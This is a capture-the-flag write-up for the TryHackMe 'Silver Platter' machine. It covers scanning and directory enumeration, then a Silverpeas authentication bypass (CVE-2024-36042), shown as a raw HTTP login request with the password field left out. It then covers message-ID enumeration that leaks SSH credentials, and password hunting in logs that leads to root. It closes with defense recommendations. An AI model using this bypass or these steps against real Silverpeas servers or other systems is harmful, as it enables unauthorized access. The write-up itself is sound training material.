# 🧠 TryHackMe — Silver Platter Write-Up

Hey everyone!  
Today I’m doing the **Silver Platter** machine on TryHackMe.

---

## 🔍 Initial Recon – Nmap Scan

Let's kick things off with a classic **Nmap scan** to see what services are exposed.

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/thm/Silver Platter]
└─$ nmap -sV -A 10.10.15.31
```

### 🔎 Nmap Output Summary:

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
8080/tcp open  http-proxy
```

#### ➕ Additional Details:
- **Port 22 (SSH)**: OpenSSH 8.9p1 running on Ubuntu
- **Port 80 (HTTP)**: Nginx web server with a title "Hack Smarter Security"
- **Port 8080**:
  - Returns a `404 Not Found` or `400 Bad Request` on most requests.
  - Seems to be a misconfigured or restricted HTTP proxy.

#### 📌 Observations:
- **Nothing too flashy**, but ports `80` and `8080` are worth deeper investigation.
- The **404** and **400** responses on `8080` may suggest a web service that reacts to specific endpoints or headers.

---

## 🔎 Vulnerability Scanning — Nuclei

Let’s see what **Nuclei** has to say about the target:

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/thm/Silver Platter]
└─$ nuclei -u http://10.10.15.31/
````

### 🧪 Nuclei Summary:

* **Version**: v3.4.3
* **Templates**: v10.2.1 (latest)

#### ⚠️ Notable Results:

* **Port 22 (SSH)**:

  * \[CVE-2023-48795] Terrapin vulnerability detected
  * SSH password auth enabled
  * Supported auth methods: `publickey`, `password`
  * Detected: OpenSSH 8.9p1

* **Port 80 (HTTP)**:

  * Web server: `nginx/1.18.0`
  * Missing security headers:

    * `Content-Security-Policy`
    * `Permissions-Policy`
    * `Strict-Transport-Security`
    * `X-Frame-Options`, `X-Content-Type-Options`, etc.

### ✅ Conclusion:

* Nuclei confirms we're dealing with a **nginx** web server lacking key security headers.
* SSH service has potentially **exploitable configurations**.

---

## 🗂️ Directory Enumeration

Let’s see what we can find using **Dirsearch** and **Gobuster**.

### 📁 Dirsearch Scan:

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/thm/Silver Platter]
└─$ dirsearch -u http://10.10.15.31/
```

#### 🔍 Results:

```
[+] 301 - /assets  ->  http://10.10.15.31/assets/
[+] 403 - /assets/
[+] 301 - /images  ->  http://10.10.15.31/images/
[+] 403 - /images/
[+] 200 - /LICENSE.txt
[+] 200 - /README.txt
```

* **Interesting files found**: `LICENSE.txt`, `README.txt`
* Directories `/assets/` and `/images/` return **403 Forbidden**

---

### 📁 Gobuster Scan (Targeting `/assets/`):

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/thm/Silver Platter]
└─$ gobuster dir -u http://10.10.15.31/assets/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#### 🔍 Results:

```
/css     (Status: 301) → http://10.10.15.31/assets/css/
/js      (Status: 301) → http://10.10.15.31/assets/js/
```

* Discovered subdirectories under `/assets/` but still **not much interaction or content revealed**.

---

## 📬 Contact Page Clue

The website had a "Contact" section that mentioned:

> *If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is `scr1ptkiddy`.*

🎯 **Boom!** We’ve got:
- A **username**: `scr1ptkiddy`
- A platform: **Silverpeas**

---

## 📂 Discovering `/silverpeas`

After some digging and scanning, I discovered the `/silverpeas` directory — a login page appeared.

The room hint suggested that credentials might relate to **rockyou.txt**, but brute force seemed discouraged. Instead, I looked for known vulnerabilities.

---

## 🚨 Exploit Found — CVE-2024-36042

While researching Silverpeas, I found the following:

> **CVE-2024-36042**  
> *Silverpeas <= 6.3.4 Authentication Bypass*  
> **Discovered by**: Chris Pritchard ([@grislygrotto](https://grislygrotto.nz))  
> **Details**: If the `Password` field is **omitted**, the server assumes the login is SSO-based and grants access to the specified user.

### 🧪 Vulnerable Request Example:
```http
POST /silverpeas/AuthenticationServlet HTTP/2
Host: target
Content-Type: application/x-www-form-urlencoded

Login=scr1ptkiddy&DomainId=0
````

This bypasses the login check entirely!

💡 **Credit to Chris** for the great find:
[https://github.com/Silverpeas/Silverpeas-Core/commit/11fb5e21c252ce4751b85fccf5b8076156e0b4f0](https://github.com/Silverpeas/Silverpeas-Core/commit/11fb5e21c252ce4751b85fccf5b8076156e0b4f0)

---

## 🔓 Accessing Silverpeas as `scr1ptkiddy`

Using **Burp Suite**, I removed the password field from the request and successfully logged in.

---

## ✉️ Reading Messages

Once inside Silverpeas, I had a **notification**:

> Tyler just asked if I wanted to play VR but he left you out `scr1ptkiddy` (what a jerk). Want to join us? We will probably hop on in like an hour or so.

Navigating to the **personal workspace**, I noticed the message was served via:

```
http://silverpeas.thm:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=5
```

So I tried enumerating the `ID` values...

---

## 🕵️ Found Credentials in Message ID 6

Request:

```http
GET /silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6 HTTP/1.1
Host: silverpeas.thm:8080
Cookie: svpLogin=scr1ptkiddy; ...
```

📥 **Response revealed**:

```
Username: Tim  
Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

---

## 💻 SSH Access

```bash
┌──(futaba㉿FutabaLab)
└─$ ssh tim@silverplatter.thm
```

Login successful! 🟢

```bash
Welcome to Ubuntu 22.04.3 LTS
tim@silver-platter:~$ ls
user.txt
tim@silver-platter:~$ cat user.txt
THM{c4ca4238a0b923820dcc509a6f75849b}
```

🏁 **User flag captured!**

---

## 🔍 Privilege Escalation – linPEAS & Log Hunting

With a foothold as `tim`, it was time to escalate. I started by running **linpeas**, and it gave me some juicy findings.

---

### 🛂 `pkexec` Policy

```ini
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin
````

This means **any user in the `sudo` or `admin` group** has elevated privileges.

---

### 👤 Users of Interest

linPEAS revealed multiple users:

```text
tyler:x:1000:1000:root:/home/tyler:/bin/bash
tim:x:1001:1001::/home/tim:/bin/bash
```

And here’s the kicker:

```text
uid=1000(tyler) gid=1000(tyler) groups=...,27(sudo),...
```

🔑 **Tyler is in the `sudo` group.** That’s our target!

---

## 🧾 Digging into Logs

I searched through `/var/log` for any useful information. After exploring:

```bash
cd /var/log
grep -iR tyler
```

📌 **Result**:

```text
POSTGRES_PASSWORD=_Zd_zx7N823/
```

A password! Hidden away in the logs.

---

## 👥 Switching to Tyler

Armed with the password, I switched users:

```bash
su tyler
```

Login successful! Now to check for sudo privileges:

```bash
sudo -l
```

🎉 **Bingo**:

```text
User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
```

---

## 🏁 Root Access

With full sudo access, I went straight for the root flag:

```bash
sudo cat /root/root.txt
```

📜 **Flag**:

```text
THM{098f6bcd4621d373cade4e832627b4f6}
```

---

## 🧠 Lessons Learned & Defense Recommendations

This box was full of real-world applicable misconfigurations and security issues. Here's a breakdown of what we exploited and how to defend against it:

---

### 🛑 1. **Avoid Hardcoded & Logged Secrets**
**Issue:**  
Sensitive credentials (like `POSTGRES_PASSWORD`) were found in log files.

**Defense:**  
- Never log plaintext secrets or environment variables.
- Periodically audit logs (`/var/log`, app logs) for accidental leaks.

---

### 🔐 2. **Keep Software Up-To-Date**
**Issue:**  
We bypassed login on Silverpeas using **CVE-2024-36042**, a known vulnerability.

**Defense:**  
- Regularly monitor CVE databases or subscribe to vendor notifications.
- Apply patches promptly, especially on externally exposed applications.

---

### 👤 3. **Enforce Strong Authentication**
**Issue:**  
We logged in by *omitting* the password due to an SSO logic flaw.

**Defense:**  
- Validate all authentication parameters on the server side.
- Enforce Multi-Factor Authentication (MFA) wherever possible.
- Disable default accounts or change their credentials (e.g., `SilverAdmin`).

---

### 🔒 4. **Limit User Privileges**
**Issue:**  
Tyler had `sudo` privileges, which allowed a full compromise.

**Defense:**  
- Use the principle of least privilege (PoLP).
- Audit group memberships (`sudo`, `adm`, etc.) regularly.
- Monitor use of `sudo` with alerting for unusual commands.

---

### 📧 5. **Secure Messaging Features**
**Issue:**  
We enumerated internal messages to find sensitive information.

**Defense:**  
- Implement proper access control on internal messaging or notification systems.
- Sanitize message contents; avoid transmitting credentials.
- Rate-limit or monitor access to predictable ID-based endpoints.

---

### 🗃️ 6. **Log File & Directory Permissions**
**Issue:**  
User `tim` could read through `/var/log`, which should be protected.

**Defense:**  
- Restrict `/var/log` access to `root` or logging users only.
- Set proper file and directory permissions using tools like `logrotate` and `auditd`.

---

## ✅ Summary

| Threat | What We Did | How to Defend |
|-------|-------------|---------------|
| Credential Leakage | Found passwords in logs | Don’t log secrets |
| Auth Bypass | Exploited CVE in Silverpeas | Patch software |
| Privilege Escalation | Abused `sudo` access | Enforce PoLP |
| Message Snooping | Enumerated inbox messages | Add access controls |

---

🎯 **Takeaway:**  
This room highlights how simple outdated software, leaked credentials, loose file permissions can chain together into full system compromise. Always patch, audit, and follow least privilege.

Stay safe, and happy hacking yall! 🔒💻

---
